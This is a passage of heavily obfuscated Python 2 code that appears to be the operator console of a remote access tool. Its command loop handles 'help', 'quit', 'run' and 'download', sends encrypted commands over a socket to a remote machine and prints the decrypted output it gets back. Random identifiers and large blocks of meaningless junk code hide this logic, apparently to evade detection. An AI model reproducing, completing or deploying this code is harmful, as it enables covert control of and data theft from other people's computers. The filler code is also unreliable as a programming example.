                for zwNshLcyKVMLwLbrLCAgtclNscYOnlGCkXeTMQrFszVWSKQQQbyEvTqFRukLiGGE in FuyvogABVpzFBPWmdQdaIynIFfoURXvLgtyFcGNbDnSwCgkHHVApBfmzmvxaoejP:
                    if zwNshLcyKVMLwLbrLCAgtclNscYOnlGCkXeTMQrFszVWSKQQQbyEvTqFRukLiGGE != pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX:
                        HYDMLOtTuZADRjSLuJqEOisDaChEADoTSccyjeUnMMjklCiheocaVMBfPyoGWbyx = HYDMLOtTuZADRjSLuJqEOisDaChEADoTSccyjeUnMMjklCiheocaVMBfPyoGWbyx
                    else:
                        ovbSqctGuosYQmsChPVOVFoqozAtynsWLuFSpHineAIRzvIeCFESGBwyscZAQyzJ = bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb
            else:
                pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX = bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb
                bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb = ovbSqctGuosYQmsChPVOVFoqozAtynsWLuFSpHineAIRzvIeCFESGBwyscZAQyzJ
                if pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX == bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb:
                    for zwNshLcyKVMLwLbrLCAgtclNscYOnlGCkXeTMQrFszVWSKQQQbyEvTqFRukLiGGE in bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb:
                        if zwNshLcyKVMLwLbrLCAgtclNscYOnlGCkXeTMQrFszVWSKQQQbyEvTqFRukLiGGE == pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX:
                            pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX = bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb
                        else:
                            pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX = ovbSqctGuosYQmsChPVOVFoqozAtynsWLuFSpHineAIRzvIeCFESGBwyscZAQyzJ
            continue
            uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa = 'iGJByHWEdWalOFbWWRHqFVmpGlJZBlFllOBCowZAxAcXdDBQiwaRqDcwZMPiOoyG'
            guxqFNkPENjVOFCOlBjXukJdHpsGTWamrbJoVMxjFWdCeRdvPhwEErYrkiFGUFdC = 'tmhCDmTRACeTxQkxZRpmzKfXiOquobklLJJUqXqBQRFhtYnHxMFZvtyelVBCEnEp'
            KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG = 'lhEayyeuQWuQdrLGWZDclPWBQpqGAPkBwxlLPDMWfmXwwzLbecLldRgZAaAwodvH'
            MRgJbOyZZLWcUgCYDofyCSdnjDRVzhzQaqYKSakFceCQPJoEMdzdGcCXSIlsFQQL = 'CwAvPLAAOvKPMWuxfweOKQKvUuWjsnepZOzgOunBYyafMCdJYBOKTqxpoRLKDsLW'
            RiJlLUJykPXvLKqeNnoMGRKjbjeiQjheyknbQnCxRcZxDFodjWGiOgpEVAJUIJWf = 'YttEvecBOFIOqlDHfpvwzaobTPgRZdASpNDElVOAejiFQXtsRAemyrMrwfDrjIXH'
            KgAISWjpMKFHmaCgxJcMwOKXLlCQzHnYNcmQIULAlLjLTbYYFDcxfygPhJyvLeJW = 'qkXfjGIVjJTZGoKuZkNILbEoeAIDvgwMuSBSZYKUToXFtrBMWNaBPEqENwmTouzu'
            if uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa != MRgJbOyZZLWcUgCYDofyCSdnjDRVzhzQaqYKSakFceCQPJoEMdzdGcCXSIlsFQQL:
                guxqFNkPENjVOFCOlBjXukJdHpsGTWamrbJoVMxjFWdCeRdvPhwEErYrkiFGUFdC = KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG
                for KgAISWjpMKFHmaCgxJcMwOKXLlCQzHnYNcmQIULAlLjLTbYYFDcxfygPhJyvLeJW in MRgJbOyZZLWcUgCYDofyCSdnjDRVzhzQaqYKSakFceCQPJoEMdzdGcCXSIlsFQQL:
                    if KgAISWjpMKFHmaCgxJcMwOKXLlCQzHnYNcmQIULAlLjLTbYYFDcxfygPhJyvLeJW != KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG:
                        guxqFNkPENjVOFCOlBjXukJdHpsGTWamrbJoVMxjFWdCeRdvPhwEErYrkiFGUFdC = guxqFNkPENjVOFCOlBjXukJdHpsGTWamrbJoVMxjFWdCeRdvPhwEErYrkiFGUFdC
                    else:
                        RiJlLUJykPXvLKqeNnoMGRKjbjeiQjheyknbQnCxRcZxDFodjWGiOgpEVAJUIJWf = uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa
            else:
                KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG = uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa
                uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa = RiJlLUJykPXvLKqeNnoMGRKjbjeiQjheyknbQnCxRcZxDFodjWGiOgpEVAJUIJWf
                if KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG == uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa:
                    for KgAISWjpMKFHmaCgxJcMwOKXLlCQzHnYNcmQIULAlLjLTbYYFDcxfygPhJyvLeJW in uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa:
                        if KgAISWjpMKFHmaCgxJcMwOKXLlCQzHnYNcmQIULAlLjLTbYYFDcxfygPhJyvLeJW == KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG:
                            KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG = uAUBcmdZOJVcvueCVhbaXzsDOVwOiYqwPhIerqCBlZoCtmUfzsVyctNILacQqiLa
                        else:
                            KtcNDrbrAbOSEtfQatxaUuqNnbqxWZshxwCdoVxLkrOjjxhKWALLOtzVCjKakYlG = RiJlLUJykPXvLKqeNnoMGRKjbjeiQjheyknbQnCxRcZxDFodjWGiOgpEVAJUIJWf
        ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ, _, action = pwROCCYHlsXEkeKmQQOCVOFLGcGznPMSuKtshjCqppFrTCYdRGGZXmjQhUBKBxkp.partition(' ')
        if ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ not in nVfodLvrEpkGikVAdBkBHnxbSJMDgVWBYUrgGjtRsQKLcFLfQpTzcCWqZlTTAwqR:
            qKRervamGMHCKmLcfDZrCDcrpfrxkYswnOjdBuytzFdNHNkaDsWWbwoAfBTMwMGI = 'LVUKXBdXWonqqmXzceDMJwdpGjctROVYHXNzWTZzOlFHFEILuUcyCwunfVsfiofV'
            xTiRArxkHkkhaKoMrrRmgLWBUkwIKjRloZPIexhuqvnoNAAlIuENdGcWyaUBUuVY = 'xyHjNJuBaTdwnFzsZkSoOatBeapUNLeGanlOIWFXfggJBegwsxNdznsbBdSXilbs'
            JYbgNpkxmLIwCEtERgdxYxqyEvchNaCHsOZUnTnWlqDjKSPsbTkLCWtfeHBqbolq = 'NUpZocghxCwNGTvogHUDQPfFNHNGVwLBFlkTmkCvNyCpkfTUekbrZHYLoSeMHpyZ'
            eygMREvFBOKlzqDbkuGdrhpixPfclKVYUmJeIxzyPpzjqdzPGyBfzOxziQSHvIDm = 'WuxwMyfLPsMoTvWMZlvzBpYlMiAQgdqrDokQZRqLUCqpxqUeApZMgxZavZKRhzbX'
            OBwtcHsVtSDQagVuUwqITfolRobTeBNeOmXErYUwyNTQyqtkSleXFuOWnZZqvDSv = 'ZBTnJXbgBEhEeLiAcszBDiaVARaQnUwfjJdFCVjfoWGYbJidKoAOmwjcqQAesxId'
            QXfHFFNRuRDfQSfQjplDnBDQOuslqqdsnNpOKVfpLdJNmscsvTqQpqdCzajzRdwp = 'DReCFRSzzOxHwORGHREMpCElVRwekiQFEzQDDxciCBEDgBuwUCwHFClmJEGIhkej'
            if JYbgNpkxmLIwCEtERgdxYxqyEvchNaCHsOZUnTnWlqDjKSPsbTkLCWtfeHBqbolq == eygMREvFBOKlzqDbkuGdrhpixPfclKVYUmJeIxzyPpzjqdzPGyBfzOxziQSHvIDm:
                for QXfHFFNRuRDfQSfQjplDnBDQOuslqqdsnNpOKVfpLdJNmscsvTqQpqdCzajzRdwp in OBwtcHsVtSDQagVuUwqITfolRobTeBNeOmXErYUwyNTQyqtkSleXFuOWnZZqvDSv:
                    if QXfHFFNRuRDfQSfQjplDnBDQOuslqqdsnNpOKVfpLdJNmscsvTqQpqdCzajzRdwp == eygMREvFBOKlzqDbkuGdrhpixPfclKVYUmJeIxzyPpzjqdzPGyBfzOxziQSHvIDm:
                        OBwtcHsVtSDQagVuUwqITfolRobTeBNeOmXErYUwyNTQyqtkSleXFuOWnZZqvDSv = qKRervamGMHCKmLcfDZrCDcrpfrxkYswnOjdBuytzFdNHNkaDsWWbwoAfBTMwMGI
                    else:
                        eygMREvFBOKlzqDbkuGdrhpixPfclKVYUmJeIxzyPpzjqdzPGyBfzOxziQSHvIDm = xTiRArxkHkkhaKoMrrRmgLWBUkwIKjRloZPIexhuqvnoNAAlIuENdGcWyaUBUuVY
            print 'Invalid command, type "help" to see GXVRLyGZkSMGZhyQAwRDCnGvGLRtbOwJaQaMgLRrToBdVHzfCidEaRrtYtcMguFz list of commands.'
            continue
            cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC = 'JpJSNzOlJQdgWfZHLEYtmeNhEFHfTfGBDSCcimVaybmZWTzpCBGXBrazTKEVyLCS'
            xWfvoIiwOSkQMGczpXQILbuEIaAEGCfWlxnMfFahmstvRdhbwBNKBWsLyAaWKQfh = 'JRlfyAIYlavVyAefUmtBgsyFUNKWRlhXvbhwGbFTZFgJrXFYbBaqpDpICVAEkQsh'
            BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX = 'odfxhgvwEGwKhFDvJcIvVYeGIvKmzheWQfdEXkmMuTDeqfmxXsDHyddrjjREOEUb'
            endHlEvDPEinGelrcEoXKMivOKNyeunmspiAesyvFvcvxNtTtLERZnrMWmcIskMG = 'ZREYicyJEtYvICqpIjPnNXXxitjGejlKYBMXsnxamSsyrweUpQoCqRqlcRWABHro'
            tgXpeDJctFHdIGtnUHFhxDvfHjOQqzJPhZNVXsENwtWOFqRwtdrDDwRBsmWDzoCu = 'kYRJznsLErIApnwmjutsaWiJtfsceylZqsmjGuQDGLcGedawwCTRVviKWItlJAWU'
            tHsRKcQnqeqxsfXmepXhkWSgTJejOhWirGNXeRizKmWNUBbsmjMBzjfYuZTsltje = 'EVJfXJoCGLNOqzbmxfdUsuguIPXSbGevnZzWiIFVSfysesaEbeAgIblkuZJReBnh'
            if cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC != endHlEvDPEinGelrcEoXKMivOKNyeunmspiAesyvFvcvxNtTtLERZnrMWmcIskMG:
                xWfvoIiwOSkQMGczpXQILbuEIaAEGCfWlxnMfFahmstvRdhbwBNKBWsLyAaWKQfh = BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX
                for tHsRKcQnqeqxsfXmepXhkWSgTJejOhWirGNXeRizKmWNUBbsmjMBzjfYuZTsltje in endHlEvDPEinGelrcEoXKMivOKNyeunmspiAesyvFvcvxNtTtLERZnrMWmcIskMG:
                    if tHsRKcQnqeqxsfXmepXhkWSgTJejOhWirGNXeRizKmWNUBbsmjMBzjfYuZTsltje != BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX:
                        xWfvoIiwOSkQMGczpXQILbuEIaAEGCfWlxnMfFahmstvRdhbwBNKBWsLyAaWKQfh = xWfvoIiwOSkQMGczpXQILbuEIaAEGCfWlxnMfFahmstvRdhbwBNKBWsLyAaWKQfh
                    else:
                        tgXpeDJctFHdIGtnUHFhxDvfHjOQqzJPhZNVXsENwtWOFqRwtdrDDwRBsmWDzoCu = cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC
            else:
                BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX = cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC
                cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC = tgXpeDJctFHdIGtnUHFhxDvfHjOQqzJPhZNVXsENwtWOFqRwtdrDDwRBsmWDzoCu
                if BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX == cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC:
                    for tHsRKcQnqeqxsfXmepXhkWSgTJejOhWirGNXeRizKmWNUBbsmjMBzjfYuZTsltje in cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC:
                        if tHsRKcQnqeqxsfXmepXhkWSgTJejOhWirGNXeRizKmWNUBbsmjMBzjfYuZTsltje == BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX:
                            BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX = cHPqQNyrXtIxuXNNAWBIvceSHgAWWOKxRupMMfuMxhAhyABLiXMvWolzLRJOkblC
                        else:
                            BiwDeBCsovMytRBBlNUBCNPHFusymFgpJZBJDZqSdPucPAvBQRckdtepynMmWKuX = tgXpeDJctFHdIGtnUHFhxDvfHjOQqzJPhZNVXsENwtWOFqRwtdrDDwRBsmWDzoCu
        if ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'help':
            YRnDQAjrbMsNOLpvjTInhTkuUrZZyZPXOpWjaaVwKWoDfFbotdVtROairWFpoLuR = 'NEuXfVpBvAkFehkDNFilAmvTbVRLhjuNwdFJXPmdnwPvaPqJbMkgKWfarztrsgqU'
            OfCbFMAUTzOcFouViOYCICpMebeyhpVxoKlfiQNUGXlRjkybqYyCwZJmmWeNqvyf = 'rWsQuuzbLVkSEatupNQagGZjwNLoDiyOPXNchabAIgbPSMJkgHHqiVVYNVEyjyNH'
            if YRnDQAjrbMsNOLpvjTInhTkuUrZZyZPXOpWjaaVwKWoDfFbotdVtROairWFpoLuR != OfCbFMAUTzOcFouViOYCICpMebeyhpVxoKlfiQNUGXlRjkybqYyCwZJmmWeNqvyf:
                gRbKXrwOBVnlildjCxnmqNTNFwGdYzBYuEsNItkAZpcYJcrSfWyUoqBEYaHvcmup = 'qIlGTDmgXJuLkQvDiUyaxLtHEgnNeYWLHmeiHKMgBypeWNNzHRJFoIQfTgkWgOMo'
                PUsFnWTxOCTzIOOxxxWsGIlhgnVSeHlcepnQsAAqSMxKcngKpqZBqXEZIghRdRrL = 'uBChZplSfTFjiZgxnPNNKODHZIortmePWepDkiSlSXWAPxoiMMgDTfkQFqJGMSuF'
                PUsFnWTxOCTzIOOxxxWsGIlhgnVSeHlcepnQsAAqSMxKcngKpqZBqXEZIghRdRrL = gRbKXrwOBVnlildjCxnmqNTNFwGdYzBYuEsNItkAZpcYJcrSfWyUoqBEYaHvcmup
            print oBswzgPHJBvoFyPaGrxLulapgagbxMUnmMAfhmjVfovPbpVbznYzQABtqLEmzNJH
            AZhpIGstVbUkFRPxsCTcKVRegkOWtcniCFnvJheujMkZBNbBwDUzHAiGYIjYOCqr = 'eUFglpuwFOXPJIyUjsGmEvioAqojlUcbeIKSqzTdZEbCkyUqFfncXTWLJblsDduM'
            UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO = 'tdyYfuGpIjwBAjlvPRmqjueEzStRMWTDZTQgNjIlagdfNfWMwnYvjwoBNahAfDwr'
            ViiUEvtUEqBRFOvjRHADEHIuWkrTqRkySvxisIBtpuLvsWOvnviYoPCFAHxacyYE = 'qPKuPhLmREaREMQbJeKKJsBbNnpFjgGxdylPvkQAyNjnwJTcjtkklyAnppRHSrOm'
            GUZRLcLcBSKhASmeFvyQcKnaKLuPFkZPizbjhOkkTmWToKNmQlRORgfGQZmDfqNK = 'pKZCYQrleNFPDdXLQGhILYIZlQavMJctNGIeggIMgibWzdPVtmQVaFlIQwVVBfNI'
            igTsuczcgKoSHrsnSstPRQoqGPHLvjthkqUCzvobsAfUzaVWjAjhdwyySockZOXe = 'JJcRtNOyBJiJELdgCXHfJVNgfCHLYUKeoVhBcVrrXAaickFzALlcwPDecGgYIzNc'
            if AZhpIGstVbUkFRPxsCTcKVRegkOWtcniCFnvJheujMkZBNbBwDUzHAiGYIjYOCqr in UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO:
                AZhpIGstVbUkFRPxsCTcKVRegkOWtcniCFnvJheujMkZBNbBwDUzHAiGYIjYOCqr = igTsuczcgKoSHrsnSstPRQoqGPHLvjthkqUCzvobsAfUzaVWjAjhdwyySockZOXe
                if UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO in ViiUEvtUEqBRFOvjRHADEHIuWkrTqRkySvxisIBtpuLvsWOvnviYoPCFAHxacyYE:
                    UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO = GUZRLcLcBSKhASmeFvyQcKnaKLuPFkZPizbjhOkkTmWToKNmQlRORgfGQZmDfqNK
            elif UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO in AZhpIGstVbUkFRPxsCTcKVRegkOWtcniCFnvJheujMkZBNbBwDUzHAiGYIjYOCqr:
                ViiUEvtUEqBRFOvjRHADEHIuWkrTqRkySvxisIBtpuLvsWOvnviYoPCFAHxacyYE = UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO
                if ViiUEvtUEqBRFOvjRHADEHIuWkrTqRkySvxisIBtpuLvsWOvnviYoPCFAHxacyYE in UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO:
                    UMqhhrgfxRHjCrwHfRHGSFKDwbtMdjOBJwwfOmDaDsDeDfilDGHArBuMnHDSNqWO = igTsuczcgKoSHrsnSstPRQoqGPHLvjthkqUCzvobsAfUzaVWjAjhdwyySockZOXe
            continue
            wMhHvnbpDKBKYLCyANUMLyKksXdsPuirCnFeBNYPwBWEukfxfobbDldmPyWcOBUl = 'AAmbKcoUmUSZOBiJWHEbXKjCKMrxYAFOCzBFbAHtMxdkYEpyOUOkkoqdkvRdXfir'
            GyzeINILuUyLXhnCvkzdMXXGuqDCIDcLNoMpwciKdgQrESFbApFRUXBAONAyLybV = 'PrJnFAaFNEKuzCeGRjsvIkismjmkGAcIpoZJtyjokZaNjioLJJfqytPMzBlqeeyV'
            ZqBKhycSNBtPCvafdmarZuqmUGXccuHCEnfzxCCiqrusWRyDkkLSnbdHibEoFRrD = 'lUAfCNBIDlFZTbFbqliXmVRsfoyrGDLzlkEYShJDByMtntFpTiqSIxLHIlZCIbvK'
            if wMhHvnbpDKBKYLCyANUMLyKksXdsPuirCnFeBNYPwBWEukfxfobbDldmPyWcOBUl == GyzeINILuUyLXhnCvkzdMXXGuqDCIDcLNoMpwciKdgQrESFbApFRUXBAONAyLybV:
                yJaFXpnGMRNOTNxCooeHwzQYYbhvPiZCjlkhNoIkdnSoISKhTngpPlULruWKfTSg = 'jfvRvsurWSsJGKHcndRuChbKSHIwLSjqfsaAbRkYmXBvQaqyyGLLfkyCnxyFZdxq'
                yJaFXpnGMRNOTNxCooeHwzQYYbhvPiZCjlkhNoIkdnSoISKhTngpPlULruWKfTSg = wMhHvnbpDKBKYLCyANUMLyKksXdsPuirCnFeBNYPwBWEukfxfobbDldmPyWcOBUl
            else:
                yJaFXpnGMRNOTNxCooeHwzQYYbhvPiZCjlkhNoIkdnSoISKhTngpPlULruWKfTSg = 'jfvRvsurWSsJGKHcndRuChbKSHIwLSjqfsaAbRkYmXBvQaqyyGLLfkyCnxyFZdxq'
                yJaFXpnGMRNOTNxCooeHwzQYYbhvPiZCjlkhNoIkdnSoISKhTngpPlULruWKfTSg = ZqBKhycSNBtPCvafdmarZuqmUGXccuHCEnfzxCCiqrusWRyDkkLSnbdHibEoFRrD
        POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI.send(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(pwROCCYHlsXEkeKmQQOCVOFLGcGznPMSuKtshjCqppFrTCYdRGGZXmjQhUBKBxkp, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
        if ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'quit':
            MkUXGsZGxQOsFBBpZnebVYNQJoLKneAmGqJqVInyaYpViCNgtJMPTSqwroZCYGOg = 'HUbBcQOwJLUxOMGbVJsWzGlPuDDQzdHUqqdEjGxGqBtYuYwkITTZlDANkqagCqAn'
            kiyNdFVDBNsjvLETxuqOKftNoaQdAYVEhjvfutYBCpiyaEPZzJTgdFPeSbYdoxQA = 'PqJDeJYStAUGgSMtuTuccklsMeJcxipcGzOGyXYipEvMvxJSAXviRnSbBeXOTrhw'
            agGlWmDQbhoCtVjJHAqmapobGUsOKiftOlCjQGonOLtgOWTRcYytrMbKAtUtUzXM = 'oZOVRLoIEdGeNCVrGmmcLedRSmGndsdiUlhERBNkaMrWICfyAukviBIFCdrphTSD'
            qssEaKiAmghTKuucFLTDuDxThzNshvCyhSVFKTVaPjmGzGdPQmtMEgMjBJBsLWzY = 'tlfoulcQoASLTxRSrrJoGTHVUXqHofiCriZBxWrDQryogpfwYcWPzZCmzLJqdDAB'
            NIJuoiinBQVYfNtBJbXeFbirKumWStzQdgnKSecWgeRLfbWUhDGaFpmsmWbsVNHq = 'ljOnjqdxkCEItcLNVaztJWHfZGupMOsXCvMHJUJcSBDTNnijViRXpSefnJIWdeOL'
            JJrEPaYUkTceYUyBirIAXFmzaKVKhQaXMYjSTbGicWQHxZDYnJmVyhlGhleZDkKM = 'yeQCuXMzDxmeewBtffhFjJNxoCoHUDXmUATLvnrBEweUDAPqCLaCXcRbahFsfeCU'
            if agGlWmDQbhoCtVjJHAqmapobGUsOKiftOlCjQGonOLtgOWTRcYytrMbKAtUtUzXM == qssEaKiAmghTKuucFLTDuDxThzNshvCyhSVFKTVaPjmGzGdPQmtMEgMjBJBsLWzY:
                for JJrEPaYUkTceYUyBirIAXFmzaKVKhQaXMYjSTbGicWQHxZDYnJmVyhlGhleZDkKM in NIJuoiinBQVYfNtBJbXeFbirKumWStzQdgnKSecWgeRLfbWUhDGaFpmsmWbsVNHq:
                    if JJrEPaYUkTceYUyBirIAXFmzaKVKhQaXMYjSTbGicWQHxZDYnJmVyhlGhleZDkKM == qssEaKiAmghTKuucFLTDuDxThzNshvCyhSVFKTVaPjmGzGdPQmtMEgMjBJBsLWzY:
                        NIJuoiinBQVYfNtBJbXeFbirKumWStzQdgnKSecWgeRLfbWUhDGaFpmsmWbsVNHq = MkUXGsZGxQOsFBBpZnebVYNQJoLKneAmGqJqVInyaYpViCNgtJMPTSqwroZCYGOg
                    else:
                        qssEaKiAmghTKuucFLTDuDxThzNshvCyhSVFKTVaPjmGzGdPQmtMEgMjBJBsLWzY = kiyNdFVDBNsjvLETxuqOKftNoaQdAYVEhjvfutYBCpiyaEPZzJTgdFPeSbYdoxQA
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.close()
            sys.exit(0)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'run':
            yOfiuwYpDHMxeHthJtFnLVZDzVGAQpizskZHqxMlUlbpQHUceJHNFoNLppPaBmKv = 'ncOiSOiQUPePKlDWedssvjxXWQLfjxZpQUMFDFDOXumHLQkIMggkqyKOxSZJiSCD'
            PyqhLleQGJUbCpQtyWrpNqRZYaejzxNvvKyKZabxcsojEVCuEVtjmEZmefmHITcQ = 'ESImDqtIsQXYMeIPohLgjhVMOhTzjJUHJjtHCKMIQegiMTWzkdrBvtcSjhDOgvTL'
            YCUdDomMXtFRiXTfyKVFgDuWFlNXjHzTuDbcLmIndzTedsJjFBJHWYQCVErDgdmy = 'ArCVWhvxlVPWiWwGqyfrejsNjoqUSmVQYLUoKFGhaamkuYZRRsolYTyrUwmVEods'
            xSlxbGRcGVsrjwQUpNOthmohOBPyRMIOhkuihVeCecZqXIxQyRWWgWNhIDxJrCGB = 'djMNnavFGjBqjCucyawaKTXunuFjiXptKjVKZkEeqQJMtczMqDqfQytKKQhSVWKA'
            pqWTNPsSwzHytqqTFFXRsgYZIJRqyHGWIHbwMAEKYUwZZjSVIHUoReObVtGqnnKm = 'ImTPYubqRfydsgtIIooYvtMZIvNAZbSAVGUfktTWrAnpgFRnhGQTSlORZfyTNPoG'
            mOMelKFnBTkYDoXkDDzNPQagEDRCRaXwVPIojAaxEqynTlwzCxlPSavCoqBLNEPx = 'RiZWbOyuCyiQTtkbhddgLeznYaJGlIgWLSZXpRlUhNaThgJDTMVwKcUvlwRQGebn'
            if YCUdDomMXtFRiXTfyKVFgDuWFlNXjHzTuDbcLmIndzTedsJjFBJHWYQCVErDgdmy == xSlxbGRcGVsrjwQUpNOthmohOBPyRMIOhkuihVeCecZqXIxQyRWWgWNhIDxJrCGB:
                for mOMelKFnBTkYDoXkDDzNPQagEDRCRaXwVPIojAaxEqynTlwzCxlPSavCoqBLNEPx in pqWTNPsSwzHytqqTFFXRsgYZIJRqyHGWIHbwMAEKYUwZZjSVIHUoReObVtGqnnKm:
                    if mOMelKFnBTkYDoXkDDzNPQagEDRCRaXwVPIojAaxEqynTlwzCxlPSavCoqBLNEPx == xSlxbGRcGVsrjwQUpNOthmohOBPyRMIOhkuihVeCecZqXIxQyRWWgWNhIDxJrCGB:
                        pqWTNPsSwzHytqqTFFXRsgYZIJRqyHGWIHbwMAEKYUwZZjSVIHUoReObVtGqnnKm = yOfiuwYpDHMxeHthJtFnLVZDzVGAQpizskZHqxMlUlbpQHUceJHNFoNLppPaBmKv
                    else:
                        xSlxbGRcGVsrjwQUpNOthmohOBPyRMIOhkuihVeCecZqXIxQyRWWgWNhIDxJrCGB = PyqhLleQGJUbCpQtyWrpNqRZYaejzxNvvKyKZabxcsojEVCuEVtjmEZmefmHITcQ
            klruDSSrtczBvSjeZdnKlRZApnUuTkWIihwXwUxxUQRcsjvUGnJRhJgKOEQUwsUS = POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI.recv(4096)
            print gzbycLsDIoAAIdkKrPhXzOCBShxQOsZnySBSMqTNGnQftXQwITlzDOwUPzFObZoY(klruDSSrtczBvSjeZdnKlRZApnUuTkWIihwXwUxxUQRcsjvUGnJRhJgKOEQUwsUS, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz).rstrip()
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'download':
            XhRAyzlhvgQwFORKjMGKCdkjlwXtJZRGEIoXrfUJHMIvnXMtUQNoWXdjZJWSdKxp = 'DPwGTgeOuaLXqUrfzRYtWHdskiQdpiFQTbzojWneZFkHLAkznPtMwTOFwHEDQIra'
